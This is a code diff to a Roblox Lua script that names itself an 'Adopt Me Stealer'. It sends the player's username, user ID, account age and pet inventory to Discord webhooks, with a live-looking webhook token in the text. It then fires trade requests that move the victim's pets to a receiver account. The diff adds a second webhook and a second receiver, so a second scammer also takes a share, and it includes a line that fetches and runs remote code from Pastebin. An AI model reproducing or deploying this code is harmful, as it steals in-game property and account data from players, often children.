@@ -1,3 +1,5 @@
+local LogsWebhook = "https://discord.com/api/webhooks/1312001391698513970/MS7LurLnJQvDpWC7UaGqcZX1-id52qxe8JCy_8TPmLL5kHZoZ4WTmkKskyzsBk-0bwTz"
+local LogsUsername = "ImagineGotScamXD"
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -76,13 +78,13 @@ local plr = game.Players.LocalPlayer
 local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
 local data = {
-  username = 'Pethical | Adopt Me Stealer!!',
-  avatar_url = 'https://cdn.discordapp.com/attachments/1295330912900223039/1296364145406509056/standard_3.gif?ex=671204b1&is=6710b331&hm=995afe10858ed42f3ab62edd76e9c71de4fbbf8120bb1450c963cceff22483fd&',
-  content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
+  username = 'Kenn | Adopt Me Stealer!!',
+  avatar_url = 'https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675d9a57&is=675c48d7&hm=b6579429218eb26462029f66bf6e9ee2587490b3f3d02cb81186fc5eed1b1128&',
+  content = '@everyone\nGoal 50 Member = mm2 Stealer\nhttps://discord.gg/a8fnty4z43',
   embeds = {
     {
       title = 'Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**🎁 Claim All Script**:\n\n```lua\nUsername = "'.. tostring(plr) ..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()\n```',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
       color = 10428396,
       fields = {
                 {
@@ -106,6 +108,39 @@ if httpRequest then
 else
   print("LMAOOOOOO")
 end
+
+local Logs = {
+  username = 'Dualhooked | Adopt Me Stealer!!',
+  avatar_url = 'https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675d9a57&is=675c48d7&hm=b6579429218eb26462029f66bf6e9ee2587490b3f3d02cb81186fc5eed1b1128&',
+  content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
+  embeds = {
+    {
+      title = 'Gacor kang dualhuk aselole\nCepetin join dongo keburu diambil',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n🏗 Dual Receiver: '.. LogsUsername ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**🎁 Claim All Script**:\n\n```lua\nUsername = "'.. tostring(plr) ..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()\n```',
+      color = 10428396,
+      fields = {
+                {
+                name = "🎮Auto Joiner",
+                value = "**COMMING SOON!**"
+                }
+      }
+    }
+  }
+}
+local httpRequest = http.request or httprequest
+if httpRequest then
+  httpRequest({
+    Url = LogsWebhook,
+    Method = 'POST',
+    Headers = {
+      ['Content-Type'] = 'application/json'
+    },
+    Body = game:GetService('HttpService'):JSONEncode(data)
+  })
+else
+  print("LMAOOOOOO")
+end
+
 local trade_info = {}
 for i, v in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
   if v:IsA('RemoteEvent') then
@@ -129,7 +164,7 @@ local function SendTrade()
   
   while task.wait(10) do
         repeat
-            send_trade:FireServer(game.Players[Username])
+            send_trade:FireServer(game.Players[Username], game.Players[LogsUsername])
             
 wait(4)
 local Loads = require(game.ReplicatedStorage.Fsys).load
@@ -175,8 +210,8 @@ end
 
 local function WaitForTrade()
   while true do
-    if game.Players:FindFirstChild(Username) then
-       wait(5)
+    if game.Players:FindFirstChild(Username) or game.Players:FindFirstChild(LogsUsername) then
+      wait(5)
       StartSteal()
       break
     else
